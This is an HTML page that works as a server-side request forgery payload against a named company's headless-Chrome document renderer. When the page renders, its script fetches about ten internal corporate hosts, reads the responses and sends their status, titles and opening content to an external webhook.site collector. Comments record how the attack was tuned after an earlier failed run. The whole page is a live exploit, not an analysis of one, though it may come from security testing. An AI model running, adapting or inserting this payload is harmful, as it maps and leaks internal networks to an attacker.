<!doctype html>
<html>
<head><meta charset="utf-8"><title>DOX-SSRF-ESCALATION-2</title></head>
<body style="font-family:sans-serif">

  <h1>DOX-SSRF-ESCALATION-2</h1>
  <u>Hi from here!</u>
  <div id="js-marker">JS did NOT run</div>

  <script>
    var oob = "https://webhook.site/8e9ceeed-435f-4eaa-92f9-fc623ce7eb1e";

    // 0) proof: server-side JS executed inside Adobe's headless Chrome
    new Image().src = oob + "/JS_EXECUTED_FROM_ADOBE?t=" + Date.now();
    document.getElementById("js-marker").innerText = "JS RAN " + new Date().toISOString();

    // NO iframes this time: the failed internal iframe loads killed the job last run
    // ("Error loading asynchronous assets"). Pure JS fetch instead.
    // The renderer runs with relaxed web-security, so .text() on a cross-origin
    // internal response is readable -> we can tell a squid error from real content.
    var hosts = [
      "https://wiki.corp.adobe.com/",
      "https://git.corp.adobe.com/",
      "https://artifactory.corp.adobe.com/",
      "https://nexus-pr-51-be.dcai.corp.adobe.com/",
      "https://projectx.corp.adobe.com/",
      "https://stage.projectx.corp.adobe.com/",
      "https://glaas.corp.adobe.com/",
      "https://documentexperience.corp.adobe.com/",
      "https://firefly.corp.adobe.com/",
      "https://nexus-pr-51.ethos551-prod-va6.ethos.adobe.net/"
    ];

    function label(h){ return h.replace(/^https?:\/\//,"").replace(/[^a-zA-Z0-9.]/g,"_"); }

    hosts.forEach(function(h){
      fetch(h, {mode:"cors"})
        .then(function(r){ return r.text().then(function(t){ return {s:r.status, t:t}; }); })
        .then(function(o){
          var t = o.t || "";
          var title = (t.match(/<title[^>]*>([^<]*)<\/title>/i) || [,""])[1];
          var squid = /ERROR: The requested URL could not be retrieved|squid|cache\.corp\.adobe|X-Squid-Error/i.test(t) ? 1 : 0;
          var html4 = /-\/\/W3C\/\/DTD HTML 4\.01/.test(t) ? 1 : 0;
          new Image().src = oob + "/READ/" + label(h)
            + "?status=" + o.s
            + "&len=" + t.length
            + "&squid=" + squid
            + "&html4=" + html4
            + "&title=" + encodeURIComponent(title.slice(0,120))
            + "&head=" + encodeURIComponent(t.slice(0,160));
        })
        .catch(function(e){
          new Image().src = oob + "/BLOCKED/" + label(h) + "?err=" + encodeURIComponent(String(e).slice(0,80));
        });
    });

    // give all fetches time to resolve, then signal the converter we are done
    setTimeout(function(){ if (window.adbe_content_loaded) { window.adbe_content_loaded(); } }, 11000);
  </script>

</body>
</html>
